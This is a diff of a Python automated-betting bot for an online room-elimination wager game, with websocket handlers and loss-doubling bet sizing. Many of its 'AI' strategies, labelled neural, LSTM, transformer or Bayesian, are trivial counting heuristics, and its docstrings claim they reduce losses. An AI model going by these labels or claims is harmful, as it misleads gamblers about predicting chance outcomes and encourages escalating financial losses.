+        total_danger = (0.3 * hist_danger) + (0.2 * crowd_danger) + (0.2 * money_danger) + (0.3 * personality_danger) + recency_penalty
+        danger_scores[r] = total_danger
+    return min(danger_scores, key=danger_scores.get)
+
+def choose_balance() -> int:
+    scores = {}
+    total_players = sum(rs['players'] for rs in room_state.values())
+    total_bet = sum(rs['bet'] for rs in room_state.values())
+    avg_players = total_players / len(ROOM_ORDER) if total_players > 0 else 0
+    avg_bet = total_bet / len(ROOM_ORDER) if total_bet > 0 else 0
+    for r in ROOM_ORDER:
+        players = room_state[r]['players']
+        bet = room_state[r]['bet']
+        score = abs(players - avg_players) / (avg_players + 1) + abs(bet - avg_bet) / (avg_bet + 1)
+        scores[r] = score
+    return min(scores, key=scores.get)
+
+def choose_most_players() -> int:
+    return max(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+
+def choose_least_players() -> int:
+    return min(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+
+def choose_richest() -> int:
+    return max(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+
+def choose_poorest() -> int:
+    return min(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+
+def choose_alternate() -> int:
+    if len(bet_history) < 2:
+        return random.choice(ROOM_ORDER)
+    last_rooms = [b.get('room') for b in list(bet_history)[-3:] if b.get('room')]
+    candidates = [r for r in ROOM_ORDER if r not in last_rooms]
+    if candidates:
+        return random.choice(candidates)
+    return random.choice(ROOM_ORDER)
+
+def choose_avoid_result() -> int:
+    if last_killed_room is None:
+        return random.choice(ROOM_ORDER)
+    candidates = [r for r in ROOM_ORDER if r != last_killed_room]
+    if not candidates:
+        return random.choice(ROOM_ORDER)
+    return random.choice(candidates)
+
+def choose_cold() -> int:
+    player_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+    bet_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+    scores = defaultdict(int)
+    for i, r in enumerate(reversed(player_ranks)):
+        scores[r] += i
+    for i, r in enumerate(reversed(bet_ranks)):
+        scores[r] += i
+    return min(scores, key=scores.get)
+
+def choose_hot() -> int:
+    player_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+    bet_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+    scores = defaultdict(int)
+    for i, r in enumerate(player_ranks):
+        scores[r] += i
+    for i, r in enumerate(bet_ranks):
+        scores[r] += i
+    return max(scores, key=scores.get)
+
+def choose_median() -> int:
+    if not any(rs['players'] > 0 for rs in room_state.values()):
+        return random.choice(ROOM_ORDER)
+    players_list = sorted(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+    bet_list = sorted(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+    median_players = players_list[len(players_list) // 2]
+    median_bet = bet_list[len(bet_list) // 2]
+    if median_players == median_bet:
+        return median_players
+    scores = {}
+    for r in ROOM_ORDER:
+        dist_players = abs(room_state[r]['players'] - room_state[median_players]['players'])
+        dist_bet = abs(room_state[r]['bet'] - room_state[median_bet]['bet'])
+        scores[r] = dist_players + dist_bet
+    return min(scores, key=scores.get)
+
+def choose_pattern() -> int:
+    if len(game_kill_log) < 3:
+        return random.choice(ROOM_ORDER)
+    last_3 = list(game_kill_log)[-3:]
+    if len(last_3) == 3 and last_3[0] == last_3[2]:
+        return last_3[1]
+    return random.choice(ROOM_ORDER)
+
+def choose_cycle_analysis() -> int:
+    if len(game_kill_log) < 6:
+        return choose_random()
+    
+    history = list(game_kill_log)
+    best_cycle = None
+    best_score = -1
+    
+    for cycle_len in range(2, 11):
+        if len(history) >= cycle_len * 2:
+            matches = 0
+            total = len(history) - cycle_len
+            for i in range(total):
+                if history[i] == history[i + cycle_len]:
+                    matches += 1
+            score = matches / max(1, total)
+            if score > best_score:
+                best_score = score
+                best_cycle = cycle_len
+    
+    if best_cycle and best_score > 0.6:
+        last_cycle_start = len(history) - best_cycle
+        if last_cycle_start >= 0:
+            predicted = history[last_cycle_start]
+            if predicted in ROOM_ORDER:
+                if predicted == last_killed_room:
+                    alternatives = [r for r in ROOM_ORDER if r != predicted]
+                    if alternatives:
+                        return random.choice(alternatives)
+                return predicted
+    
+    return choose_smart_safe_enhanced()
+
+def choose_trend_analysis() -> int:
+    if len(killer_history) < 5:
+        return choose_random()
+    
+    player_trends = []
+    bet_trends = []
+    for h in killer_history[-10:]:
+        player_trends.append(h['players'])
+        bet_trends.append(h['bet'])
+    
+    if len(player_trends) >= 3:
+        player_slope = (player_trends[-1] - player_trends[0]) / max(1, len(player_trends))
+        bet_slope = (bet_trends[-1] - bet_trends[0]) / max(1, len(bet_trends))
+        next_players = player_trends[-1] + player_slope * 1.5
+        next_bet = bet_trends[-1] + bet_slope * 1.5
+        
+        scores = {}
+        for r in ROOM_ORDER:
+            if r == last_killed_room:
+                scores[r] = -999999
+                continue
+            players = room_state[r]['players']
+            bet = room_state[r]['bet']
+            player_dist = abs(players - next_players) / (next_players + 1)
+            bet_dist = abs(bet - next_bet) / (next_bet + 1)
+            scores[r] = player_dist + bet_dist
+        
+        return max(scores, key=scores.get)
+    
+    return choose_random()
+
+def choose_vip_random() -> int:
+    logic_list = [
+        choose_random, choose_min_player_bet, choose_probability,
+        choose_follow_killer, choose_sequential, choose_killer_personality_enhanced,
+        choose_smart_safe_enhanced, choose_follow_killer_delayed, choose_hide_seek_master,
+        choose_balance, choose_most_players, choose_least_players,
+        choose_richest, choose_poorest, choose_alternate,
+        choose_avoid_result, choose_cold, choose_hot, choose_median, choose_pattern,
+        choose_cycle_analysis, choose_trend_analysis
+    ]
+    sys_random = random.SystemRandom()
+    chosen_func = sys_random.choice(logic_list)
+    return chosen_func()
+
+def choose_killer_wave() -> int:
+    if len(game_kill_log) < 4:
+        return choose_random()
+    last_4 = list(game_kill_log)[-4:]
+    for i in range(1, 4):
+        if len(last_4) >= i*2 and last_4[-i:] == last_4[-i*2:-i]:
+            predicted = last_4[-i-1] if len(last_4) > i else last_4[-1]
+            return predicted
+    return choose_smart_safe_enhanced()
+
+def choose_psycho_analysis() -> int:
+    max_players_room = max(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+    max_bet_room = max(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+    crowd_favorite = max_players_room if room_state[max_players_room]['players'] > room_state[max_bet_room]['players'] else max_bet_room
+    candidates = [r for r in ROOM_ORDER if r != crowd_favorite]
+    if candidates:
+        return min(candidates, key=lambda r: room_state[r]['players'] + room_state[r]['bet'] * 0.01)
+    return choose_random()
+
+def choose_markov_chain() -> int:
+    """Markov v2: dự đoán phòng kill kế → cược phòng KHÁC (an toàn)."""
+    if len(game_kill_log) < 3:
+        return _vth_pick_max(_vth_unified_scores())
+    # bậc 1
+    t1 = defaultdict(lambda: defaultdict(float))
+    for a, b in zip(game_kill_log, list(game_kill_log)[1:]):
+        t1[a][b] += 1.0
+    last = game_kill_log[-1]
+    # bậc 2 nếu đủ dữ liệu
+    pred_kill_scores = {r: 0.15 for r in ROOM_ORDER}
+    if len(game_kill_log) >= 3:
+        t2 = defaultdict(lambda: defaultdict(float))
+        log = list(game_kill_log)
+        for i in range(len(log) - 2):
+            t2[(log[i], log[i + 1])][log[i + 2]] += 1.0
+        key = (log[-2], log[-1])
+        if t2[key]:
+            for r, c in t2[key].items():
+                pred_kill_scores[r] += c
+    if t1[last]:
+        for r, c in t1[last].items():
+            pred_kill_scores[r] += c * 0.85
+    # chọn phòng ít khả năng bị kill nhất
+    return min(pred_kill_scores, key=pred_kill_scores.get)
+
+def choose_deep_learning_enhanced() -> int:
+    if len(killer_history) < 5:
+        return choose_random()
+    
+    weights = {}
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        survival_rate = (survives + 1) / (kills + survives + 2)
+        
+        recent_boost = 0
+        if r in game_kill_log:
+            recent_count = list(game_kill_log).count(r)
+            recent_boost = -0.3 * min(1, recent_count / 3)
+        
+        trend_boost = 0
+        if len(game_kill_log) >= 5:
+            last_5 = list(game_kill_log)[-5:]
+            if r in last_5:
+                recent_appear = last_5.count(r)
+                trend_boost = -0.2 * recent_appear
+            else:
+                trend_boost = 0.1
+        
+        max_players = max(rs['players'] for rs in room_state.values()) or 1
+        max_bet = max(rs['bet'] for rs in room_state.values()) or 1
+        crowd_boost = 1 - (room_state[r]['players'] / max_players)
+        money_boost = 1 - (room_state[r]['bet'] / max_bet)
+        
+        killer_pattern_boost = 0
+        if len(game_kill_log) >= 3:
+            last_3 = list(game_kill_log)[-3:]
+            if len(last_3) == 3 and last_3[0] == last_3[2] and last_3[0] == r:
+                killer_pattern_boost = -0.4
+        
+        weights[r] = (0.25 * survival_rate + 0.20 * recent_boost + 0.15 * trend_boost + 0.15 * crowd_boost + 0.10 * money_boost + 0.15 * killer_pattern_boost)
+        weights[r] += random.uniform(-0.08, 0.08)
+    
+    return max(weights, key=weights.get)
+
+def choose_reinforcement() -> int:
+    if len(bet_history) < 3:
+        return choose_random()
+    action_scores = {r: 0 for r in ROOM_ORDER}
+    for b in list(bet_history)[-10:]:
+        room = b.get('room')
+        result = b.get('result')
+        if room in ROOM_ORDER and result:
+            if result == "Thắng":
+                action_scores[room] += 1
+            else:
+                action_scores[room] -= 0.5
+    max_score = max(action_scores.values())
+    if max_score <= 0:
+        return choose_random()
+    best_rooms = [r for r, s in action_scores.items() if s == max_score]
+    return random.choice(best_rooms)
+
+def choose_bayesian() -> int:
+    """Bayes v2: posterior P(kill) kết hợp form realtime → chọn min."""
+    if len(game_kill_log) < 2:
+        return _vth_pick_max(_vth_unified_scores())
+    room_counts = Counter(game_kill_log)
+    total_kills = len(game_kill_log)
+    posterior = {}
+    for r in ROOM_ORDER:
+        prior = 1.0 / len(ROOM_ORDER)
+        like = (room_counts.get(r, 0) + 0.8) / (total_kills + 0.8 * len(ROOM_ORDER))
+        # evidence: đông / nhiều tiền → sát thủ hay chọn
+        max_p = max(room_state[x].get("players", 0) or 0 for x in ROOM_ORDER) or 1
+        max_b = max(room_state[x].get("bet", 0) or 0 for x in ROOM_ORDER) or 1
+        crowd = (room_state[r].get("players", 0) or 0) / max_p
+        money = (room_state[r].get("bet", 0) or 0) / max_b
+        evidence = 0.55 + 0.25 * crowd + 0.20 * money
+        posterior[r] = prior * like * evidence
+    s = sum(posterior.values()) or 1
+    for r in posterior:
+        posterior[r] /= s
+    return min(posterior, key=posterior.get)
+
+def choose_k_means() -> int:
+    if len(game_kill_log) < 6:
+        return choose_random()
+    from collections import defaultdict
+    room_features = defaultdict(lambda: [0, 0])
+    for i, room in enumerate(list(game_kill_log)[-10:]):
+        room_features[room][0] += 1
+        room_features[room][1] = i
+    cluster_1 = set()
+    cluster_2 = set()
+    for room, features in room_features.items():
+        if features[0] < 2:
+            cluster_1.add(room)
+        else:
+            cluster_2.add(room)
+    if cluster_1:
+        return random.choice(list(cluster_1))
+    return choose_random()
+
+def choose_neural() -> int:
+    if len(killer_history) < 3:
+        return choose_random()
+    scores = {}
+    for r in ROOM_ORDER:
+        players = room_state[r]['players']
+        bet = room_state[r]['bet']
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        layer1 = (0.3 * survives) - (0.5 * kills) + (0.2 * players) - (0.3 * bet)
+        layer2 = (0.4 * layer1) + (0.2 * (survives - kills))
+        layer3 = (0.5 * layer2) + (0.3 * (1 - players/max(1, max(rs['players'] for rs in room_state.values()))))
+        output = 1 / (1 + math.exp(-layer3))
+        scores[r] = output
+    return max(scores, key=scores.get)
+
+def choose_fuzzy() -> int:
+    if len(killer_history) < 2:
+        return choose_random()
+    scores = {}
+    for r in ROOM_ORDER:
+        players = room_state[r]['players']
+        bet = room_state[r]['bet']
+        players_young = max(0, 1 - players/2) if players < 2 else 0
+        players_mid = max(0, 1 - abs(players-3)/2) if 1 < players < 5 else 0
+        players_old = max(0, (players-4)/2) if players > 4 else 0
+        bet_low = max(0, 1 - bet/100) if bet < 100 else 0
+        bet_mid = max(0, 1 - abs(bet-300)/200) if 100 < bet < 500 else 0
+        bet_high = max(0, (bet-400)/200) if bet > 400 else 0
+        rule1 = min(players_young, bet_low)
+        rule2 = min(players_old, bet_high)
+        rule3 = min(players_mid, bet_mid)
+        safety_score = (rule1 * 1.0 + rule2 * 0.0 + rule3 * 0.5) / (rule1 + rule2 + rule3 + 0.01)
+        scores[r] = safety_score
+    return max(scores, key=scores.get)
+
+def choose_genetic() -> int:
+    if len(killer_history) < 5:
+        return choose_random()
+    population = list(game_kill_log)[-10:]
+    if not population:
+        return choose_random()
+    fitness = {}
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        fitness[r] = (survives + 1) / (kills + survives + 2)
+    return max(fitness, key=fitness.get)
+
+def choose_ant_colony() -> int:
+    if len(game_kill_log) < 3:
+        return choose_random()
+    pheromone = {}
+    for r in ROOM_ORDER:
+        count = list(game_kill_log).count(r)
+        pheromone[r] = count / len(game_kill_log) if game_kill_log else 0
+    return min(pheromone, key=pheromone.get)
+
+def choose_particle_swarm() -> int:
+    if len(killer_history) < 3:
+        return choose_random()
+    scores = {}
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        survival_rate = (survives + 1) / (kills + survives + 2)
+        recent_trend = 0.3 if r in list(game_kill_log)[-3:] else 0
+        scores[r] = survival_rate + recent_trend
+    return max(scores, key=scores.get)
+
+def choose_knn() -> int:
+    if len(game_kill_log) < 3:
+        return choose_random()
+    k = min(3, len(game_kill_log))
+    nearest = list(game_kill_log)[-k:]
+    counts = Counter(nearest)
+    min_count = min(counts.values())
+    candidates = [r for r, c in counts.items() if c == min_count]
+    if candidates:
+        return random.choice(candidates)
+    return choose_random()
+
+def choose_decision_tree() -> int:
+    if len(killer_history) < 5:
+        return choose_random()
+    return choose_probability() if killer_history else choose_random()
+
+def choose_random_forest() -> int:
+    if len(killer_history) < 3:
+        return choose_random()
+    predictions = []
+    for _ in range(5):
+        if random.random() > 0.5:
+            predictions.append(choose_probability())
+        else:
+            predictions.append(choose_min_player_bet())
+    counts = Counter(predictions)
+    return max(counts, key=counts.get)
+
+def choose_gradient_boost() -> int:
+    if len(killer_history) < 3:
+        return choose_random()
+    scores = {}
+    for r in ROOM_ORDER:
+        base_score = 0.5
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        survival_rate = (survives + 1) / (kills + survives + 2)
+        base_score += 0.3 * survival_rate
+        base_score -= 0.1 * (room_state[r]['players'] / max(1, max(rs['players'] for rs in room_state.values())))
+        base_score -= 0.1 * (room_state[r]['bet'] / max(1, max(rs['bet'] for rs in room_state.values())))
+        scores[r] = base_score
+    return max(scores, key=scores.get)
+
+def choose_lstm() -> int:
+    if len(game_kill_log) < 4:
+        return choose_random()
+    last_5 = list(game_kill_log)[-5:]
+    if len(last_5) == 5 and last_5[0] == last_5[3] and last_5[1] == last_5[4]:
+        return last_5[2]
+    return choose_markov_chain()
+
+def choose_transformer() -> int:
+    if len(game_kill_log) < 4:
+        return choose_random()
+    attention_scores = {}
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        recency = 1 - (list(game_kill_log).count(r) / max(1, len(game_kill_log)))
+        attention_scores[r] = (0.4 * recency) + (0.3 * (survives / max(1, kills + survives))) + (0.3 * (1 - room_state[r]['players'] / max(1, max(rs['players'] for rs in room_state.values()))))
+    return max(attention_scores, key=attention_scores.get)
+
+def choose_ensemble_enhanced() -> int:
+    """Ensemble v3: multi-AI + unified score + adaptive performance + anti-kill."""
+    base = _vth_unified_scores(noise=0.02)
+    votes = defaultdict(float)
+    for r, sc in base.items():
+        votes[r] += sc * 1.15
+
+    ai_weights = {
+        "choose_safe_risk": 1.45,
+        "choose_smart_safe_enhanced": 1.15,
+        "choose_probability": 0.9,
+        "choose_markov_chain": 1.05,
+        "choose_bayesian": 1.0,
+        "choose_killer_personality_enhanced": 0.7,
+        "choose_deep_learning_enhanced": 0.7,
+        "choose_hide_seek_master": 0.5,
+        "choose_neural": 0.65,
+        "choose_cycle_analysis": 0.6,
+        "choose_trend_analysis": 0.55,
+        "choose_transformer": 0.55,
+    }
+    for ai_name, weight in ai_weights.items():
+        try:
+            func = globals().get(ai_name)
+            if not func:
+                continue
+            room = func()
+            w = float(weight)
+            perf = AI_PERFORMANCE.get(ai_name, {}) or AI_PERFORMANCE.get(ai_name.replace("choose_", "").upper(), {})
+            total_p = int(perf.get("total", 0) or 0)
+            if total_p >= 4:
+                wr = float(perf.get("wins", 0)) / total_p
+                w *= 0.5 + 1.0 * wr
+            votes[room] += w
+        except Exception:
+            continue
+
+    if not votes:
+        picks = _vth_conservative_pick(list(ROOM_ORDER), 1)
+        return picks[0] if picks else random.choice(ROOM_ORDER)
+    top = _vth_pick_max(dict(votes))
+    picks = _vth_conservative_pick([top] + sorted(votes.keys(), key=lambda r: votes[r], reverse=True), 1)
+    return picks[0] if picks else top
+
+ENHANCED_LOGIC_MAP = {
+    "RANDOM": choose_random,
+    "MIN_PLAYER_BET": choose_min_player_bet,
+    "PROBABILITY": choose_probability,
+    "FOLLOW_KILLER": choose_follow_killer,
+    "SEQUENTIAL": choose_sequential,
+    "KILLER_PERSONALITY": choose_killer_personality_enhanced,
+    "SMART_SAFE": choose_smart_safe_enhanced,
+    "FOLLOW_KILLER_DELAYED": choose_follow_killer_delayed,
+    "HIDE_SEEK_MASTER": choose_hide_seek_master,
+    "BALANCE": choose_balance,
+    "MOST_PLAYERS": choose_most_players,
+    "LEAST_PLAYERS": choose_least_players,
+    "RICHEST": choose_richest,
+    "POOREST": choose_poorest,
+    "ALTERNATE": choose_alternate,
+    "AVOID_RESULT": choose_avoid_result,
+    "COLD": choose_cold,
+    "HOT": choose_hot,
+    "MEDIAN": choose_median,
+    "PATTERN": choose_pattern,
+    "VIP_RANDOM": choose_vip_random,
+    "KILLER_WAVE": choose_killer_wave,
+    "PSYCHO_ANALYSIS": choose_psycho_analysis,
+    "MARKOV_CHAIN": choose_markov_chain,
+    "DEEP_LEARNING": choose_deep_learning_enhanced,
+    "REINFORCEMENT": choose_reinforcement,
+    "BAYESIAN": choose_bayesian,
+    "K_MEANS": choose_k_means,
+    "NEURAL": choose_neural,
+    "FUZZY": choose_fuzzy,
+    "GENETIC": choose_genetic,
+    "ANT_COLONY": choose_ant_colony,
+    "PARTICLE_SWARM": choose_particle_swarm,
+    "KNN": choose_knn,
+    "DECISION_TREE": choose_decision_tree,
+    "RANDOM_FOREST": choose_random_forest,
+    "GRADIENT_BOOST": choose_gradient_boost,
+    "LSTM": choose_lstm,
+    "TRANSFORMER": choose_transformer,
+    "ENSEMBLE": choose_ensemble_enhanced,
+    "SAFE_RISK": choose_safe_risk,
+    "CYCLE_ANALYSIS": choose_cycle_analysis,
+    "TREND_ANALYSIS": choose_trend_analysis,
+}
+
+
+def choose_rooms_multi(mode: str, n: int = 1) -> Tuple[List[int], str]:
+    """Chọn n phòng — AI + lọc risk thấp (giảm thua)."""
+    global _key_type
+    n = max(1, min(4, int(n or 1)))
+    mode = (mode or "ENSEMBLE").upper()
+    if not is_ai_available(mode, _key_type):
+        mode = "RANDOM"
+    try:
+        scores = _vth_unified_scores(noise=0.02)
+    except Exception:
+        scores = {r: random.random() for r in ROOM_ORDER}
+    # tăng trọng risk thấp
+    try:
+        for row in compute_vth_room_risk() or []:
+            rid = int(row.get("id") or 0)
+            if rid in scores:
+                scores[rid] += 0.40 * (1.0 - float(row.get("risk_pct", 50) or 50) / 100.0)
+    except Exception:
+        pass
+    try:
+        if mode != "SAFE_RISK":
+            primary, _ = choose_room_tn(mode)
+            if primary in scores:
+                scores[primary] += 0.25
+    except Exception:
+        pass
+    ranked = sorted(scores.keys(), key=lambda r: scores[r], reverse=True)
+    # lọc conservative
+    filtered = _vth_conservative_pick(ranked, n)
+    if not filtered:
+        return [], mode
+    return filtered, mode
+
+
+def choose_room_tn(mode: str) -> Tuple[int, str]:
+    global _key_type
+    mode = mode.upper()
+    if not is_ai_available(mode, _key_type):
+        safe_console_print(f"[yellow]⚠️ AI {mode} không khả dụng với key {_key_type}. Chuyển sang RANDOM.[/yellow]")
+        mode = "RANDOM"
+    func = ENHANCED_LOGIC_MAP.get(mode, choose_random)
+    chosen_room = func()
+    return chosen_room, mode
+
+def update_ai_performance(algo_name: str, is_win: bool):
+    if is_win:
+        AI_PERFORMANCE[algo_name]["wins"] += 1
+    else:
+        AI_PERFORMANCE[algo_name]["losses"] += 1
+    AI_PERFORMANCE[algo_name]["total"] += 1
+    try:
+        with open('ai_performance.json', 'w', encoding='utf-8') as f:
+            json.dump(dict(AI_PERFORMANCE), f, indent=2)
+    except:
+        pass
+
+def get_best_ai() -> str:
+    best_ai = "RANDOM"
+    best_rate = 0
+    for ai_name, stats in AI_PERFORMANCE.items():
+        if stats["total"] >= 5:
+            rate = stats["wins"] / stats["total"]
+            if rate > best_rate:
+                best_rate = rate
+                best_ai = ai_name
+    return best_ai
+
+def calculate_smart_bet(base_bet: float, multiplier: float, lose_streak: int, current_balance: float, max_bet_percent: float = 0.2) -> float:
+    bet = base_bet * (multiplier ** lose_streak)
+    max_allowed = current_balance * max_bet_percent
+    if bet > max_allowed:
+        safe_console_print(f"[yellow]⚠️ Cược {bet:.2f} vượt quá {max_bet_percent*100}% số dư. Reset về {base_bet:.2f}.[/yellow]")
+        bet = base_bet
+    if lose_streak > 5:
+        bet = min(bet, current_balance * 0.05)
+    return round(bet, 2)
+    # ================== WEBSOCKET ==================
+
+def safe_send_enter_game(ws):
+    if not ws:
+        return
+    try:
+        uid = USER_ID
+        secret = SECRET_KEY
+        # thử nhiều dạng payload (API đôi khi cần string)
+        payloads = [
+            {
+                "msg_type": "handle_enter_game",
+                "asset_type": "BUILD",
+                "user_id": uid,
+                "user_secret_key": secret,
+            },
+            {
+                "msg_type": "handle_enter_game",
+                "asset_type": "BUILD",
+                "user_id": str(uid) if uid is not None else "",
+                "user_secret_key": str(secret) if secret is not None else "",
+            },
+            {
+                "msg_type": "handle_enter_game",
+                "assetType": "BUILD",
+                "userId": uid,
+                "userSecretKey": secret,
+            },
+        ]
+        for payload in payloads:
+            try:
+                ws.send(json.dumps(payload, ensure_ascii=False))
+            except Exception:
+                continue
+    except Exception:
+        pass
+
+def _extract_issue_id(d: Dict[str, Any]) -> Optional[int]:
+    if not isinstance(d, dict):
+        return None
+    possible = []
+    for key in ("issue_id", "issueId", "issue", "id"):
+        v = d.get(key)
+        if v is not None:
+            possible.append(v)
+    if isinstance(d.get("data"), dict):
+        for key in ("issue_id", "issueId", "issue", "id"):
+            v = d["data"].get(key)
+            if v is not None:
+                possible.append(v)
+    for p in possible:
+        try:
+            return int(p)
+        except Exception:
+            try:
+                return int(str(p))
+            except Exception:
+                continue
+    return None
+
+def on_open(ws):
+    global _ws_status, last_msg_ts
+    _ws["ws"] = ws
+    _ws_status = "✅ Đã kết nối"
+    last_msg_ts = time.time()
+    safe_send_enter_game(ws)
+    # gửi lại enter sau 1.5s (tránh miss gói đầu)
+    def _reenter():
+        time.sleep(1.5)
+        if not stop_flag:
+            safe_send_enter_game(ws)
+    threading.Thread(target=_reenter, daemon=True).start()
+
+
+def _vth_begin_new_issue(new_issue) -> bool:
+    """Chuyển sang kỳ mới: mở khóa, xóa target, cho phép cược lại. True nếu kỳ đổi."""
+    global issue_id, killed_room, prediction_locked, predicted_room, predicted_rooms, ui_state, round_warning
+    global analysis_start_ts, issue_start_ts, issue_end_ts, round_index, count_down
+    if new_issue is None:
+        return False
+    try:
+        ni = int(new_issue)
+    except Exception:
+        ni = new_issue
+    try:
+        cur = int(issue_id) if issue_id is not None else None
+    except Exception:
+        cur = issue_id
+    if cur is not None and ni == cur:
+        return False
+    # Chỉ tiến kỳ (tránh gói result kỳ cũ kéo ngược)
+    try:
+        if cur is not None and int(ni) < int(cur):
+            return False
+    except Exception:
+        pass
+    issue_id = ni
+    killed_room = None
+    prediction_locked = False
+    predicted_room = None
+    predicted_rooms = []
+    round_warning = ""
+    ui_state = "ANALYZING"
+    analysis_start_ts = time.time()
+    issue_start_ts = time.time()
+    issue_end_ts = issue_start_ts + 60.0
+    round_index += 1
+    try:
+        if len(bet_sent_for_issue) > 40:
+            bet_sent_for_issue.clear()
+        if len(bet_room_sent) > 80:
+            bet_room_sent.clear()
+        if len(skipped_for_issue) > 40:
+            skipped_for_issue.clear()
+    except Exception:
+        pass
+    return True
+
+
+def on_message(ws, message):
+    global issue_id, count_down, killed_room, round_index, ui_state, analysis_start_ts, issue_start_ts, issue_end_ts
+    global prediction_locked, predicted_room, last_killed_room, last_killed_room_delayed, last_msg_ts, current_bet, last_finished_issue, last_finished_label
+    global win_streak, lose_streak, max_win_streak, max_lose_streak, cumulative_profit, _skip_rounds_remaining, stop_flag
+    
+    last_msg_ts = time.time()
+    try:
+        if isinstance(message, bytes):
+            try:
+                message = message.decode("utf-8", errors="replace")
+            except Exception:
+                message = str(message)
+        data = None
+        try:
+            data = json.loads(message)
+        except Exception:
+            try:
+                data = json.loads(message.replace("'", '"'))
+            except Exception:
+                return
+        if isinstance(data, dict) and isinstance(data.get("data"), str):
+            try:
+                inner = json.loads(data.get("data"))
+                merged = dict(data)
+                merged.update(inner)
+                data = merged
+            except Exception:
+                pass
+        msg_type = data.get("msg_type") or data.get("type") or ""
+        msg_type = str(msg_type)
+        new_issue = _extract_issue_id(data)
+        # Nhảy kỳ từ mọi gói có issue_id mới (không chỉ issue_stat)
+        if new_issue is not None:
+            try:
+                _vth_begin_new_issue(new_issue)
+            except Exception:
+                if issue_id is None:
+                    issue_id = new_issue
+        if msg_type == "notify_enter_game":
+            info = data.get("info", {})
+            if isinstance(info, dict):
+                if info.get("start_time"):
+                    st = float(info.get("start_time"))
+                    if st > time.time() * 500: st /= 1000.0
+                    issue_start_ts = st
+                if info.get("end_time"):
+                    et = float(info.get("end_time"))
+                    if et > time.time() * 500: et /= 1000.0
+                    issue_end_ts = et
+                # issue trong info
+                ei = _extract_issue_id(info) or _extract_issue_id(data)
+                if ei is not None:
+                    issue_id = ei
+            if data.get("last_killed_room_id"):
+                try:
+                    last_killed_room = int(data["last_killed_room_id"])
+                except Exception:
+                    pass
+            room_stat = data.get("room_stat", [])
+            if not room_stat and isinstance(data.get("data"), dict):
+                room_stat = data["data"].get("room_stat", []) or data["data"].get("rooms", [])
+            if isinstance(room_stat, list):
+                for rm in room_stat:
+                    _process_room_update(rm)
+            if ui_state in ("WAITING", "IDLE", "CHỜ") and (issue_id or any(room_state[r].get("players", 0) > 0 for r in ROOM_ORDER)):
+                ui_state = "ANALYZING"
+                analysis_start_ts = time.time()
+        if msg_type == "notify_issue_stat" or "issue_stat" in msg_type:
+            rooms = data.get("rooms") or []
+            if not rooms and isinstance(data.get("data"), dict):
+                rooms = data["data"].get("rooms", [])
+            for rm in (rooms or []):
+                _process_room_update(rm)
+                try:
+                    rid = int(rm.get("room_id") or rm.get("roomId") or rm.get("id"))
+                except Exception:
+                    continue
+                players = int(rm.get("user_cnt") or rm.get("userCount") or 0) or 0
+                bet = int(rm.get("total_bet_amount") or rm.get("totalBet") or rm.get("bet") or 0) or 0
+                room_state[rid] = {"players": players, "bet": bet}
+                room_stats[rid]["last_players"] = players
+                room_stats[rid]["last_bet"] = bet
+            if new_issue is not None:
+                changed = _vth_begin_new_issue(new_issue)
+                if data.get("start_time"):
+                    try:
+                        st = float(data.get("start_time"))
+                        if st > time.time() * 500:
+                            st /= 1000.0
+                        issue_start_ts = st
+                        issue_end_ts = st + 60.0
+                    except Exception:
+                        pass
+                # Nếu cùng kỳ nhưng vẫn đang RESULT → về ANALYZING để cược tiếp
+                if not changed and ui_state == "RESULT" and issue_id is not None:
+                    try:
+                        already = int(issue_id) in {int(x) for x in bet_sent_for_issue}
+                    except Exception:
+                        already = issue_id in bet_sent_for_issue
+                    if not already:
+                        prediction_locked = False
+                        predicted_room = None
+                        ui_state = "ANALYZING"
+                        analysis_start_ts = time.time()
+        elif msg_type == "notify_count_down" or "count_down" in msg_type:
+            count_down = data.get("count_down") or data.get("countDown") or data.get("count") or count_down
+            try:
+                count_val = int(count_down)
+            except Exception:
+                count_val = None
+            # Countdown: tôn trọng setting; chỉ ép khi còn <=8s
+            if count_val is not None and count_val <= 8:
+                if str(ui_state) == "SKIP":
+                    pass
+                else:
+                    if ui_state == "RESULT":
+                        ui_state = "ANALYZING"
+                        if not prediction_locked:
+                            analysis_start_ts = time.time()
+                    lock_prediction_if_needed(force=False)
+        elif msg_type == "notify_result" or "result" in msg_type:
+            # --- lấy phòng sát thủ ---
+            kr = None
+            possible_keys = [
+                "killed_room", "killed_room_id", "killedRoom", "killedRoomId",
+                "kill_room", "room_id", "roomId", "result_room", "win_room",
+            ]
+            for key in possible_keys:
+                if data.get(key) is not None:
+                    kr = data.get(key)
+                    break
+            if kr is None and isinstance(data.get("data"), dict):
+                for key in possible_keys:
+                    if data["data"].get(key) is not None:
+                        kr = data["data"].get(key)
+                        break
+            if kr is None and isinstance(data.get("info"), dict):
+                for key in possible_keys:
+                    if data["info"].get(key) is not None:
+                        kr = data["info"].get(key)
+                        break
+
+            # Kỳ của kết quả (ưu tiên issue trong message, không dùng issue hiện tại đã sang ván mới)
+            result_issue = None
+            try:
+                result_issue = _extract_issue_id(data)
+            except Exception:
+                result_issue = None
+            if result_issue is None:
+                result_issue = issue_id
+
+            def _same_issue(a, b) -> bool:
+                try:
+                    return int(a) == int(b)
+                except Exception:
+                    return str(a) == str(b)
+
+            def _is_pending(res) -> bool:
+                s = str(res or "").strip().lower()
